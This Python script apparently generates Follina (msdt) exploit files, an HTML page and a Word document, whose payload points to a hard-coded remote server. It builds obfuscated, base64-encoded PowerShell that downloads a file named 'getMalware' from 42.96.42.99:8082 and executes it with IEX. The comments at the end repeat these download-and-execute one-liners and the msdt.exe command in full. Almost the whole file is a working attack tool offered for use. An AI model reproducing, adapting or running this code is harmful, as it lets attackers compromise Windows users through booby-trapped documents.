import base64
import os
import shutil
# http://42.96.42.99:8082/getMalware
# http://42.96.42.99:8082/htmlfolina
# HOST='192.168.43.243'
HOST='42.96.42.99'
PORT='8082'
SSL= 0
follina_url = '/htmlfolina'
raw_payload= 'getMalware'
def Follina():
    f = open("Follina.txt", "r")
    template = f.read()
    f.close()
    # command = "Hello World"
    command="""msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param \\\"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{Base64}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\\\""""
    payload = "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$s=$V.DownloadString('{HTTP}://{ip}:{port}/{raw}');IEX($s)"
    # payload ="Invoke-WebRequest http://42.96.42.99:8082/getMalware -OutFile /media/n33r9/Data/Desktop/NCKH22/Gen_Follina;"
    commandP = 'Start-Process powershell -ArgumentList "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\'{payload}\')))"'
    #  payload => commandP => command => template (Follina.txt) => gen Follina.html
    if SSL:
        payload = payload.replace('{ip}', HOST).replace('{port}', PORT).replace("{raw}",raw_payload).replace("{HTTP}", "https")
    else:
        payload = payload.replace('{ip}', HOST).replace('{port}', PORT).replace("{raw}",raw_payload).replace("{HTTP}", "http")
    payload=base64.b64encode(bytearray(payload, "UTF-8"))
    PROCESS = commandP.replace('{payload}', payload.decode("UTF-8"))
    PROCESS=base64.b64encode(bytearray(PROCESS, "UTF-8"))
    command=command.replace("{Base64}", PROCESS.decode("UTF-8"))
    template=template.replace("{payload}",command)
    out = open("Follina/follina.html", "w")
    out.write(template)
    out.close()
    print(template)

    if os.path.isdir('Follina/Follinadoc'):
        """#
        CC = ''
        while len(CC) == 0:
            CC = console.input('[cyan][-] Need to Remove old Follina template Folder in utils/payloads/Follina/Follinadoc , press Y if you want to continue[cyan] [green](Y/N)[/green]: ')
            if CC != "Y":
                return
        """
        shutil.rmtree('Follina/Follinadoc')

    if os.path.isfile('Follina/Follinadoc.docx'):
        os.remove('Follina/Follinadoc.docx')
        print ("Old Follina Folder Removed")
        # console.log("[red][+] Old Follina Folder Removed[/red]")
    shutil.copytree("Follina-2", "Follina/Follinadoc")
    # console.log("[green][+] Follina HTML Payload written to:[/green]  [magenta]Follina/follina.html[/magenta]")
    f = open("Follina/Follinadoc/word/_rels/document.xml.rels", "r")
    payload = f.read()
    payload=payload.replace("{payload}",command)
    #follina_url
    if SSL:
        payload = payload.replace('{ip}', HOST).replace('{port}', PORT).replace("{follina_url}",follina_url).replace("{HTTP}", "https")
    else:
        payload = payload.replace('{ip}', HOST).replace('{port}', PORT).replace("{follina_url}",follina_url).replace("{HTTP}", "http")
    f.close()
    f = open("Follina/Follinadoc/word/_rels/document.xml.rels", "w")
    f.write(payload)
    f.close()
    shutil.make_archive("Follina/Follinadoc.docx", 'zip', "Follina/Follinadoc/")
    os.rename('Follina/Follinadoc.docx.zip', 'Follina/Follinadoc.docx')
    # console.log("[green][+] Follina Document Payload written to:[/green]  [magenta]Follina/Follinadoc.docx[/magenta]")

if __name__ =="__main__":
    Follina()
    
    
# Start-Process powershell -ArgumentList "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$s=$V.DownloadString('http://42.96.42.99:8082/getMalware');IEX($s)')))"

# $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$s=$V.DownloadString('http://42.96.42.99:8082/getMalware');IEX($s)

# window.location.href = "msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'Start-Process powershell -ArgumentList "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$s=$V.DownloadString('http://42.96.42.99:8082/getMalware');IEX($s)')))"'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";